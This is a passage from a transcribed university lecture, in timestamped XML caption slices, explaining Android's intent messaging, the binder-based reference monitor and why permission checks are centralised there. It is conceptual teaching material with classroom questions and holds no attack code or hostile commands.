              <text_slice>of dialing the phone number
that's in the object, perhaps.</text_slice>
            </slice>
            <slice>
              <time_slice>16:17</time_slice>
              <text_slice>And finally, the
data is basically</text_slice>
            </slice>
            <slice>
              <time_slice>16:20</time_slice>
              <text_slice>an arbitrary URI
or URL for the data</text_slice>
            </slice>
            <slice>
              <time_slice>16:24</time_slice>
              <text_slice>that you want to send
along with this message.</text_slice>
            </slice>
            <slice>
              <time_slice>16:28</time_slice>
              <text_slice>So it could be something like
a telephone, colon, some digits</text_slice>
            </slice>
            <slice>
              <time_slice>16:32</time_slice>
              <text_slice>to dial the phone number.</text_slice>
            </slice>
            <slice>
              <time_slice>16:34</time_slice>
              <text_slice>It could be an actual HTTP URL
that you want to view or open.</text_slice>
            </slice>
            <slice>
              <time_slice>16:40</time_slice>
              <text_slice>It might be any
other applications</text_slice>
            </slice>
            <slice>
              <time_slice>16:42</time_slice>
              <text_slice>you find URI as well.</text_slice>
            </slice>
            <slice>
              <time_slice>16:44</time_slice>
              <text_slice>So this is how you
send these messages.</text_slice>
            </slice>
            <slice>
              <time_slice>16:47</time_slice>
              <text_slice>And the way these
messages are actually</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>routed through the system is
with the help of the Android</text_slice>
            </slice>
            <slice>
              <time_slice>16:55</time_slice>
              <text_slice>runtime itself that
sits underneath all</text_slice>
            </slice>
            <slice>
              <time_slice>16:57</time_slice>
              <text_slice>these applications.</text_slice>
            </slice>
            <slice>
              <time_slice>16:59</time_slice>
              <text_slice>So you can think of
the Android runtime</text_slice>
            </slice>
            <slice>
              <time_slice>17:02</time_slice>
              <text_slice>as being somewhere between the
applications and the kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>17:06</time_slice>
              <text_slice>It's not quite
correct, but maybe</text_slice>
            </slice>
            <slice>
              <time_slice>17:08</time_slice>
              <text_slice>let's try to draw some
picture to clarify</text_slice>
            </slice>
            <slice>
              <time_slice>17:11</time_slice>
              <text_slice>what the architecture of
this thing looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>17:14</time_slice>
              <text_slice>So you have one application
that's running on Android.</text_slice>
            </slice>
            <slice>
              <time_slice>17:20</time_slice>
              <text_slice>Perhaps you have
another application.</text_slice>
            </slice>
            <slice>
              <time_slice>17:23</time_slice>
              <text_slice>These are all boxes
that are basically</text_slice>
            </slice>
            <slice>
              <time_slice>17:24</time_slice>
              <text_slice>these guys-- a
separate application</text_slice>
            </slice>
            <slice>
              <time_slice>17:27</time_slice>
              <text_slice>with a bunch of
components internally.</text_slice>
            </slice>
            <slice>
              <time_slice>17:29</time_slice>
              <text_slice>Of course, these guys
are all processes running</text_slice>
            </slice>
            <slice>
              <time_slice>17:32</time_slice>
              <text_slice>on top of the Linux kernel.</text_slice>
            </slice>
            <slice>
              <time_slice>17:36</time_slice>
              <text_slice>So that's providing
some degree of isolation</text_slice>
            </slice>
            <slice>
              <time_slice>17:38</time_slice>
              <text_slice>between the applications.</text_slice>
            </slice>
            <slice>
              <time_slice>17:39</time_slice>
              <text_slice>And then there's what the paper
calls the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>17:45</time_slice>
              <text_slice>And this guy is
going to mediate all</text_slice>
            </slice>
            <slice>
              <time_slice>17:47</time_slice>
              <text_slice>the intent-level interactions
between the different apps</text_slice>
            </slice>
            <slice>
              <time_slice>17:51</time_slice>
              <text_slice>here.</text_slice>
            </slice>
            <slice>
              <time_slice>17:52</time_slice>
              <text_slice>So if App 1 wants to
send a message to App 2,</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>they actually are going to
send a message to the reference</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>monitor first.</text_slice>
            </slice>
            <slice>
              <time_slice>17:59</time_slice>
              <text_slice>So this is how you send
all intents in Android,</text_slice>
            </slice>
            <slice>
              <time_slice>18:01</time_slice>
              <text_slice>is that you create one
of these intent messages.</text_slice>
            </slice>
            <slice>
              <time_slice>18:04</time_slice>
              <text_slice>And you basically send it over
some pipe to this reference</text_slice>
            </slice>
            <slice>
              <time_slice>18:08</time_slice>
              <text_slice>monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>So Android basically has
its own implementation</text_slice>
            </slice>
            <slice>
              <time_slice>18:11</time_slice>
              <text_slice>of pipes for sending these
kinds of intents, called binder.</text_slice>
            </slice>
            <slice>
              <time_slice>18:16</time_slice>
              <text_slice>And every Android
application, by convention,</text_slice>
            </slice>
            <slice>
              <time_slice>18:19</time_slice>
              <text_slice>is going to open a
binder connection over</text_slice>
            </slice>
            <slice>
              <time_slice>18:22</time_slice>
              <text_slice>to the reference monitor,
so the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>can get intents from
this application</text_slice>
            </slice>
            <slice>
              <time_slice>18:27</time_slice>
              <text_slice>as well as send messages
over to this application.</text_slice>
            </slice>
            <slice>
              <time_slice>18:30</time_slice>
              <text_slice>So in our case, if App 1
writes an intent for App 2</text_slice>
            </slice>
            <slice>
              <time_slice>18:35</time_slice>
              <text_slice>to the reference monitor,
the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>is going to figure out where
this intent should go and relay</text_slice>
            </slice>
            <slice>
              <time_slice>18:40</time_slice>
              <text_slice>it over here to App 2.</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>So Application 2 can
maybe start an activity,</text_slice>
            </slice>
            <slice>
              <time_slice>18:47</time_slice>
              <text_slice>or receive a message, or
do a SQL query, et cetera,</text_slice>
            </slice>
            <slice>
              <time_slice>18:52</time_slice>
              <text_slice>for App 1.</text_slice>
            </slice>
            <slice>
              <time_slice>18:53</time_slice>
              <text_slice>Does that make sense, roughly,
in terms of what's going on?</text_slice>
            </slice>
            <slice>
              <time_slice>18:56</time_slice>
              <text_slice>Yeah, question.</text_slice>
            </slice>
            <slice>
              <time_slice>18:57</time_slice>
              <text_slice>AUDIENCE: Does
the label checking</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>happen once it gets to that,
or does the reference monitor?</text_slice>
            </slice>
            <slice>
              <time_slice>19:00</time_slice>
              <text_slice>PROFESSOR: Ah, yeah, yeah, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>19:01</time_slice>
              <text_slice>So the reference monitor,
hugely, importantly,</text_slice>
            </slice>
            <slice>
              <time_slice>19:03</time_slice>
              <text_slice>is in charge of checking
all the permissions that are</text_slice>
            </slice>
            <slice>
              <time_slice>19:07</time_slice>
              <text_slice>represented by these labels.</text_slice>
            </slice>
            <slice>
              <time_slice>19:09</time_slice>
              <text_slice>So you could imagine
different things</text_slice>
            </slice>
            <slice>
              <time_slice>19:12</time_slice>
              <text_slice>going on in terms of
checking the permissions</text_slice>
            </slice>
            <slice>
              <time_slice>19:16</time_slice>
              <text_slice>in the apps themselves.</text_slice>
            </slice>
            <slice>
              <time_slice>19:18</time_slice>
              <text_slice>So why do these guys
actually do the checking</text_slice>
            </slice>
            <slice>
              <time_slice>19:21</time_slice>
              <text_slice>in the reference monitor
instead of in the applications?</text_slice>
            </slice>
            <slice>
              <time_slice>19:26</time_slice>
              <text_slice>Would it make sense to do
the checking in the app?</text_slice>
            </slice>
            <slice>
              <time_slice>19:30</time_slice>
              <text_slice>Suppose we stuck the
label checks into App 1.</text_slice>
            </slice>
            <slice>
              <time_slice>19:35</time_slice>
              <text_slice>Would that be reasonable?</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>AUDIENCE: Well, that
seems like a bad idea,</text_slice>
            </slice>
            <slice>
              <time_slice>19:38</time_slice>
              <text_slice>because if someone
compromises the [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>19:41</time_slice>
              <text_slice>and is able to its behavior
and get past the checking.</text_slice>
            </slice>
            <slice>
              <time_slice>19:45</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>Right.</text_slice>
            </slice>
            <slice>
              <time_slice>19:46</time_slice>
              <text_slice>So you probably don't want
to stick it in the sender,</text_slice>
            </slice>
            <slice>
              <time_slice>19:48</time_slice>
              <text_slice>because you don't really
want to trust the sender.</text_slice>
            </slice>
            <slice>
              <time_slice>19:50</time_slice>
              <text_slice>So if you install a particular
malicious application,</text_slice>
            </slice>
            <slice>
              <time_slice>19:52</time_slice>
              <text_slice>if you want to be
able to handle,</text_slice>
            </slice>
            <slice>
              <time_slice>19:54</time_slice>
              <text_slice>that application
isn't going to be</text_slice>
            </slice>
            <slice>
              <time_slice>19:55</time_slice>
              <text_slice>guaranteed to do the
correct checks for us.</text_slice>
            </slice>
            <slice>
              <time_slice>19:58</time_slice>
              <text_slice>So that seems a
little unfortunate.</text_slice>
            </slice>
            <slice>
              <time_slice>20:00</time_slice>
              <text_slice>So we're not allowed to do
the checks on the sender site.</text_slice>
            </slice>
            <slice>
              <time_slice>20:04</time_slice>
              <text_slice>What about doing the checks
on the receive side in App 2?</text_slice>
            </slice>
            <slice>
              <time_slice>20:09</time_slice>
              <text_slice>What about that?</text_slice>
            </slice>
            <slice>
              <time_slice>20:11</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>AUDIENCE: You could, but
it would need crypto,</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>and you would need a PKI.</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>So it would be much
more [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>20:17</time_slice>
              <text_slice>PROFESSOR: OK.</text_slice>
            </slice>
            <slice>
              <time_slice>20:17</time_slice>
              <text_slice>So you're thinking this would
have to be crypto and have</text_slice>
            </slice>
            <slice>
              <time_slice>20:19</time_slice>
              <text_slice>to have a PKI involved.</text_slice>
            </slice>
            <slice>
              <time_slice>20:21</time_slice>
              <text_slice>So I'm not sure you
have to have crypto,</text_slice>
            </slice>
            <slice>
              <time_slice>20:23</time_slice>
              <text_slice>because the kernel can tell
you exactly where things</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>are coming from.</text_slice>
            </slice>
            <slice>
              <time_slice>20:27</time_slice>
              <text_slice>So you could still have the
reference monitor telling you,</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>oh, this is coming from App 1.</text_slice>
            </slice>
            <slice>
              <time_slice>20:32</time_slice>
              <text_slice>So you don't really need
the PKI in that sense.</text_slice>
            </slice>
            <slice>
              <time_slice>20:34</time_slice>
              <text_slice>It doesn't have to
be crypto-related.</text_slice>
            </slice>
            <slice>
              <time_slice>20:36</time_slice>
              <text_slice>I think you need
crypto generally</text_slice>
            </slice>
            <slice>
              <time_slice>20:37</time_slice>
              <text_slice>when you're talking over the
network, when there's nothing</text_slice>
            </slice>
            <slice>
              <time_slice>20:40</time_slice>
              <text_slice>common that you can trust.</text_slice>
            </slice>
            <slice>
              <time_slice>20:41</time_slice>
              <text_slice>Here, I think it's not
so much about crypto.</text_slice>
            </slice>
            <slice>
              <time_slice>20:44</time_slice>
              <text_slice>Any other reasons why you
would actually maybe want it</text_slice>
            </slice>
            <slice>
              <time_slice>20:47</time_slice>
              <text_slice>in that reference monitor?</text_slice>
            </slice>
            <slice>
              <time_slice>20:47</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>20:48</time_slice>
              <text_slice>AUDIENCE: You might want
to shift the burden away</text_slice>
            </slice>
            <slice>
              <time_slice>20:49</time_slice>
              <text_slice>from the developer,
who ends up making</text_slice>
            </slice>
            <slice>
              <time_slice>20:51</time_slice>
              <text_slice>a lot of mistakes [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>20:52</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>20:53</time_slice>
              <text_slice>I think a huge part
of it is app bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>20:55</time_slice>
              <text_slice>If you don't really
want silly bugs</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>that the application
developer makes</text_slice>
            </slice>
            <slice>
              <time_slice>20:59</time_slice>
              <text_slice>to compromise the security.</text_slice>
            </slice>
            <slice>
              <time_slice>21:01</time_slice>
              <text_slice>So to the extent
possible, I think</text_slice>
            </slice>
            <slice>
              <time_slice>21:02</time_slice>
              <text_slice>you want to factor out common
functionality into code</text_slice>
            </slice>
            <slice>
              <time_slice>21:05</time_slice>
              <text_slice>that the developer doesn't
have to worry about so much,</text_slice>
            </slice>
            <slice>
              <time_slice>21:09</time_slice>
              <text_slice>or doesn't even have a
chance of screwing up.</text_slice>
            </slice>
            <slice>
              <time_slice>21:11</time_slice>
              <text_slice>So this seems like partially
a good reason for sticking</text_slice>
            </slice>
            <slice>
              <time_slice>21:14</time_slice>
              <text_slice>to the reference monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>21:15</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>21:15</time_slice>
              <text_slice>AUDIENCE: It could
also be because you</text_slice>
            </slice>
            <slice>
              <time_slice>21:17</time_slice>
              <text_slice>want to minimize the trusted
surface of the entire system.</text_slice>
            </slice>
            <slice>
              <time_slice>21:20</time_slice>
              <text_slice>So you want to make the
reference monitor so small</text_slice>
            </slice>
            <slice>
              <time_slice>21:22</time_slice>
              <text_slice>that it can actually be
[? orbited ?] on its own,</text_slice>
            </slice>
            <slice>
              <time_slice>21:24</time_slice>
              <text_slice>or have some component that
deals with the actual label</text_slice>
            </slice>
            <slice>
              <time_slice>21:27</time_slice>
              <text_slice>checking that can be
checked on its own.</text_slice>
            </slice>
            <slice>
              <time_slice>21:29</time_slice>
              <text_slice>PROFESSOR: Right.</text_slice>
            </slice>
            <slice>
              <time_slice>21:29</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>21:29</time_slice>
              <text_slice>So that seems like a
financially reasonable plan</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>as well, because the
security of the role system</text_slice>
            </slice>
            <slice>
              <time_slice>21:33</time_slice>
              <text_slice>depends on the reference
monitor being correct.</text_slice>
            </slice>
            <slice>
              <time_slice>21:35</time_slice>
              <text_slice>Well, you could see
this going either way.</text_slice>
            </slice>
            <slice>
              <time_slice>21:36</time_slice>
              <text_slice>Actually putting the logic
into the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>21:39</time_slice>
              <text_slice>makes the reference
monitor bigger.</text_slice>
            </slice>
            <slice>
              <time_slice>21:40</time_slice>
              <text_slice>So you could make the
RM smaller by delegating</text_slice>
            </slice>
            <slice>
              <time_slice>21:42</time_slice>
              <text_slice>some work to the apps.</text_slice>
            </slice>
            <slice>
              <time_slice>21:44</time_slice>
              <text_slice>Although, then there is some
library you have to audit.</text_slice>
            </slice>
            <slice>
              <time_slice>21:46</time_slice>
              <text_slice>So it's not exactly clear.</text_slice>
            </slice>
            <slice>
              <time_slice>21:48</time_slice>
              <text_slice>I think the one other
example I came up</text_slice>
            </slice>
            <slice>
              <time_slice>21:51</time_slice>
              <text_slice>with for why to do this-- well,
I guess there was two things.</text_slice>
            </slice>
            <slice>
              <time_slice>21:54</time_slice>
              <text_slice>One is just simplicity.</text_slice>
            </slice>
            <slice>
              <time_slice>21:54</time_slice>
              <text_slice>I think it's easier
to do the checks</text_slice>
            </slice>
            <slice>
              <time_slice>21:56</time_slice>
              <text_slice>all in one place in many ways.</text_slice>
            </slice>
            <slice>
              <time_slice>21:59</time_slice>
              <text_slice>So you can sort of-- as you were
saying, that you could really</text_slice>
            </slice>
            <slice>
              <time_slice>22:02</time_slice>
              <text_slice>look at this and say, oh, yup,
the checks are being done.</text_slice>
            </slice>
            <slice>
              <time_slice>22:04</time_slice>
              <text_slice>They're always being
done on every message.</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>So that's convincing or good
from a software engineering</text_slice>
            </slice>
            <slice>
              <time_slice>22:10</time_slice>
              <text_slice>perspective, perhaps.</text_slice>
            </slice>
            <slice>
              <time_slice>22:11</time_slice>
              <text_slice>Another thing is
that these intents</text_slice>
            </slice>
            <slice>
              <time_slice>22:13</time_slice>
              <text_slice>have two addressing modes.</text_slice>
            </slice>
            <slice>
              <time_slice>22:17</time_slice>
              <text_slice>In particular, in
the paper, they</text_slice>
            </slice>
            <slice>
              <time_slice>22:18</time_slice>
              <text_slice>describe what are called
implicit and explicit intents.</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>So explicit intents
are ones where</text_slice>
            </slice>
            <slice>
              <time_slice>22:24</time_slice>
              <text_slice>you specify some component.</text_slice>
            </slice>
            <slice>
              <time_slice>22:26</time_slice>
              <text_slice>And you actually
say it has to go</text_slice>
            </slice>
            <slice>
              <time_slice>22:27</time_slice>
              <text_slice>to this particular component.</text_slice>
            </slice>
            <slice>
              <time_slice>22:29</time_slice>
              <text_slice>So for these explicit intents,
it's actually totally fine</text_slice>
            </slice>
            <slice>
              <time_slice>22:32</time_slice>
              <text_slice>to do the checking
on the receiver side,</text_slice>
            </slice>
            <slice>
              <time_slice>22:34</time_slice>
              <text_slice>because well, you know where
you're going to send it.</text_slice>
            </slice>
            <slice>
              <time_slice>22:36</time_slice>
              <text_slice>You can send it there.</text_slice>
            </slice>
            <slice>
              <time_slice>22:37</time_slice>
              <text_slice>And if it doesn't want to
allow you to send the message,</text_slice>
            </slice>
            <slice>
              <time_slice>22:40</time_slice>
              <text_slice>it'll drop it on the floor
or reject it somehow.</text_slice>
            </slice>
            <slice>
              <time_slice>22:43</time_slice>
              <text_slice>But then there's also
implicit intents in Android,</text_slice>
            </slice>
            <slice>
              <time_slice>22:45</time_slice>
              <text_slice>where you don't
know, as a sender,</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>exactly which application you
want to receive your message.</text_slice>
            </slice>
            <slice>
              <time_slice>22:52</time_slice>
              <text_slice>So this might happen if you
just want to view a picture</text_slice>
            </slice>
            <slice>
              <time_slice>22:55</time_slice>
              <text_slice>or you want to dial
a phone number,</text_slice>
            </slice>
            <slice>
              <time_slice>22:56</time_slice>
              <text_slice>but you don't actually
know which phone</text_slice>
            </slice>
            <slice>
              <time_slice>22:58</time_slice>
              <text_slice>dialer the user has installed.</text_slice>
            </slice>
            <slice>
              <time_slice>23:00</time_slice>
              <text_slice>Maybe it has a Google Voice,
Voice-over IP dialer, or Skype,</text_slice>
            </slice>
            <slice>
              <time_slice>23:03</time_slice>
              <text_slice>or who knows what.</text_slice>
            </slice>
            <slice>
              <time_slice>23:05</time_slice>
              <text_slice>So in those case, these
implicit intents actually</text_slice>
            </slice>
            <slice>
              <time_slice>23:07</time_slice>
              <text_slice>skip the component
name and just say,</text_slice>
            </slice>
            <slice>
              <time_slice>23:09</time_slice>
              <text_slice>I want this action to be
handled with this data</text_slice>
            </slice>
            <slice>
              <time_slice>23:12</time_slice>
              <text_slice>by some application out there.</text_slice>
            </slice>
            <slice>
              <time_slice>23:15</time_slice>
              <text_slice>And in this case, it's the
job of the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>23:17</time_slice>
              <text_slice>to find an application
that's suitable for handling</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>that kind of message--
dialing a phone number,</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>viewing a PDF, or a JPEG
image, or what have you.</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>And in that case,
the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>23:28</time_slice>
              <text_slice>can actually take
permissions into account</text_slice>
            </slice>
            <slice>
              <time_slice>23:30</time_slice>
              <text_slice>when choosing a
suitable application.</text_slice>
            </slice>
            <slice>
              <time_slice>23:33</time_slice>
              <text_slice>So it might be that there are
some very sensitive PDF viewer</text_slice>
            </slice>
            <slice>
              <time_slice>23:36</time_slice>
              <text_slice>application you have
installed, and it's</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>capable of viewing
PDFs, but you don't want</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>it accessible to most apps.</text_slice>
            </slice>
            <slice>
              <time_slice>23:42</time_slice>
              <text_slice>So maybe the permissions on it
don't allow that application</text_slice>
            </slice>
            <slice>
              <time_slice>23:44</time_slice>
              <text_slice>to receive PDF View messages
from the rest of the system.</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>So in this case, the reference
monitor will look at this</text_slice>
            </slice>
            <slice>
              <time_slice>23:51</time_slice>
              <text_slice>and say, well,
you're not allowed</text_slice>
            </slice>
            <slice>
              <time_slice>23:52</time_slice>
              <text_slice>to send your request there,
but maybe another application</text_slice>
            </slice>
            <slice>
              <time_slice>23:54</time_slice>
              <text_slice>is willing to
handle your request.</text_slice>
            </slice>
            <slice>
              <time_slice>23:56</time_slice>
              <text_slice>So this sort of simplifies
the user interface or user</text_slice>
            </slice>
            <slice>
              <time_slice>23:59</time_slice>
              <text_slice>interaction here by matching
an available system,</text_slice>
            </slice>
            <slice>
              <time_slice>24:03</time_slice>
              <text_slice>including and considering
the permissions that</text_slice>
            </slice>
            <slice>
              <time_slice>24:06</time_slice>
              <text_slice>are available to the sender.</text_slice>
            </slice>
            <slice>
              <time_slice>24:08</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>24:09</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>24:11</time_slice>
              <text_slice>Any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>24:14</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>24:15</time_slice>
              <text_slice>AUDIENCE: Would the reference
monitor ever be a bottleneck?</text_slice>
            </slice>
            <slice>
              <time_slice>24:18</time_slice>
              <text_slice>PROFESSOR: It could be, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>24:19</time_slice>
              <text_slice>So a lot of these messages
are sent through the reference</text_slice>
            </slice>
            <slice>
              <time_slice>24:21</time_slice>
              <text_slice>monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>24:22</time_slice>
              <text_slice>And I don't know whether it's
actually currently multi-thread</text_slice>
            </slice>
            <slice>
              <time_slice>24:25</time_slice>
              <text_slice>or not.</text_slice>
            </slice>
            <slice>
              <time_slice>24:26</time_slice>
              <text_slice>You probably could
make it multi-thread.</text_slice>
            </slice>
            <slice>
              <time_slice>24:28</time_slice>
              <text_slice>I think the logic
it's implementing</text_slice>
            </slice>
            <slice>
              <time_slice>24:29</time_slice>
              <text_slice>doesn't involve maintaining
a lot of shared state.</text_slice>
            </slice>
            <slice>
              <time_slice>24:32</time_slice>
              <text_slice>So you could probably process
many of intent messages</text_slice>
            </slice>
            <slice>
              <time_slice>24:35</time_slice>
              <text_slice>in parallel if need be.</text_slice>
            </slice>
            <slice>
              <time_slice>24:37</time_slice>
              <text_slice>I suspect that
you could probably</text_slice>
            </slice>
            <slice>
              <time_slice>24:38</time_slice>
              <text_slice>avoid it being a bottleneck.</text_slice>
            </slice>
            <slice>
              <time_slice>24:40</time_slice>
              <text_slice>For bulk things, Android
has an RPC mechanism</text_slice>
            </slice>
            <slice>
              <time_slice>24:43</time_slice>
              <text_slice>that the paper
talks about, where</text_slice>
            </slice>
            <slice>
              <time_slice>24:45</time_slice>
              <text_slice>if you want to send
a lot of operations</text_slice>
            </slice>
            <slice>
              <time_slice>24:46</time_slice>
              <text_slice>to another application,
you actually</text_slice>
            </slice>
            <slice>
              <time_slice>24:48</time_slice>
              <text_slice>send what's called a bind
intent to the reference monitor,</text_slice>
            </slice>
            <slice>
              <time_slice>24:52</time_slice>
              <text_slice>saying, I want a direct
connection to this application.</text_slice>
            </slice>
            <slice>
              <time_slice>24:54</time_slice>
              <text_slice>And if you send a bind intent
to the reference monitor</text_slice>
            </slice>
            <slice>
              <time_slice>24:57</time_slice>
              <text_slice>and it [? forwards the app ?]
to this app,</text_slice>
            </slice>
            <slice>
              <time_slice>24:58</time_slice>
              <text_slice>then you're going to establish
this sort of bound channel</text_slice>
            </slice>
            <slice>
              <time_slice>25:02</time_slice>
              <text_slice>between these two
apps and then send</text_slice>
            </slice>
            <slice>
              <time_slice>25:03</time_slice>
              <text_slice>lots of messages
directly [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>25:05</time_slice>
              <text_slice>So if some
application is worried</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
              <text_slice>about an interface which
is performance-critical,</text_slice>
            </slice>
            <slice>
              <time_slice>25:10</time_slice>
              <text_slice>they'll probably do this.</text_slice>
            </slice>
            <slice>
              <time_slice>25:12</time_slice>
              <text_slice>Yeah, question?</text_slice>
            </slice>
            <slice>
              <time_slice>25:13</time_slice>
              <text_slice>AUDIENCE: Why does
the [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>25:15</time_slice>
              <text_slice>Because every single label
needs to match [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>PROFESSOR: Ah.</text_slice>
            </slice>
            <slice>
              <time_slice>25:21</time_slice>
              <text_slice>So here, it's not
the case that you get</text_slice>
            </slice>
            <slice>
              <time_slice>25:24</time_slice>
              <text_slice>direct access inside of App 2.</text_slice>
            </slice>
            <slice>
              <time_slice>25:27</time_slice>
              <text_slice>It's not that you can directly
manipulate all the stuff</text_slice>
            </slice>
            <slice>
              <time_slice>25:30</time_slice>
              <text_slice>in the address space or
the objects of App 2.</text_slice>
            </slice>
            <slice>
              <time_slice>25:33</time_slice>
              <text_slice>You just get a channel
that the other application</text_slice>
            </slice>
            <slice>
              <time_slice>25:36</time_slice>
              <text_slice>is willing to look
at messages of</text_slice>
            </slice>
            <slice>
              <time_slice>25:39</time_slice>
              <text_slice>and do something sensible
with these messages.</text_slice>
            </slice>
            <slice>
              <time_slice>25:43</time_slice>
              <text_slice>So it's up to the Application 2
here to look at these messages</text_slice>
            </slice>
            <slice>
              <time_slice>25:47</time_slice>
              <text_slice>and do something
sensible with them,</text_slice>
            </slice>
            <slice>
              <time_slice>25:49</time_slice>
              <text_slice>not to allow arbitrary code
execution or arbitrary access.</text_slice>
            </slice>
            <slice>
              <time_slice>25:52</time_slice>
              <text_slice>But in this application, I think
they have two operations where</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>you can add a new friend or
enable or disable tracking</text_slice>
            </slice>
            <slice>
              <time_slice>25:59</time_slice>
              <text_slice>through this interface.</text_slice>
            </slice>
            <slice>
              <time_slice>26:01</time_slice>
              <text_slice>So there's well-defined
messages that you define.</text_slice>
            </slice>
            <slice>
              <time_slice>26:03</time_slice>
              <text_slice>And you're going to
implement probably</text_slice>
            </slice>
            <slice>
              <time_slice>26:04</time_slice>
              <text_slice>one of these [? surface ?]
components that's</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>responsible for
taking a message,</text_slice>
            </slice>
            <slice>
              <time_slice>26:07</time_slice>
              <text_slice>and checking that it's sensible,
and executing that operation.</text_slice>
            </slice>
            <slice>
              <time_slice>26:11</time_slice>
              <text_slice>Question?</text_slice>
            </slice>
            <slice>
              <time_slice>26:11</time_slice>
              <text_slice>AUDIENCE: Well, so
I guess intents are</text_slice>
            </slice>
            <slice>
              <time_slice>26:14</time_slice>
              <text_slice>usually human-initiated, right?</text_slice>
            </slice>
            <slice>
              <time_slice>26:16</time_slice>
              <text_slice>PROFESSOR: Oftentimes yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>AUDIENCE: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>And humans are pretty slow.</text_slice>
            </slice>
            <slice>
              <time_slice>26:20</time_slice>
              <text_slice>So it's unlikely that the
reference monitor is going</text_slice>
            </slice>
            <slice>
              <time_slice>26:22</time_slice>
              <text_slice>to be any kind of bottleneck.</text_slice>
            </slice>
            <slice>
              <time_slice>26:24</time_slice>
              <text_slice>PROFESSOR: Yes,
that's probably true.</text_slice>
            </slice>
            <slice>
              <time_slice>26:25</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>26:26</time_slice>
              <text_slice>It depends on exactly, yeah, I
guess how you're using intents.</text_slice>
            </slice>
            <slice>
              <time_slice>26:29</time_slice>
              <text_slice>It's a little bit of a bummer.</text_slice>
            </slice>
            <slice>
              <time_slice>26:30</time_slice>
              <text_slice>In the paper, they say
that the permissions</text_slice>
            </slice>
            <slice>
              <time_slice>26:33</time_slice>
              <text_slice>add [? buying ?] time are
checked by the reference</text_slice>
            </slice>
            <slice>
              <time_slice>26:35</time_slice>
              <text_slice>monitor.</text_slice>
            </slice>
            <slice>
              <time_slice>26:36</time_slice>
              <text_slice>But the permissions on
individual RPC calls</text_slice>
            </slice>
            <slice>
              <time_slice>26:38</time_slice>
              <text_slice>between these
applications are not</text_slice>
            </slice>
            <slice>
              <time_slice>26:39</time_slice>
              <text_slice>checked by the
reference monitor,</text_slice>
            </slice>
            <slice>
              <time_slice>26:40</time_slice>
              <text_slice>because you have this
direct channel between two</text_slice>
            </slice>
            <slice>
